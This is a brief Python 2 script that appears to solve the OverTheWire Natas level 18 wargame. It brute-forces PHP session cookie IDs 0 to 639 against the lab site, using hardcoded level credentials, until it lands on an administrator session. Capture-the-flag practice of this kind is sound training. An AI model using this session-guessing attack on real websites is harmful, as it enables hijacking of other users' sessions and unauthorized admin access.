#!/usr/bin/python

import requests
from requests.auth import HTTPBasicAuth

level = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

for i in range(640):
	print 'Trying', i
	r = requests.get('http://natas18.natas.labs.overthewire.org/index.php',
					auth = HTTPBasicAuth(level, password),
					cookies = {"PHPSESSID":str(i)})
	if 'You are an admin' in r.text:
		print 'Found session', i
		break
		
	
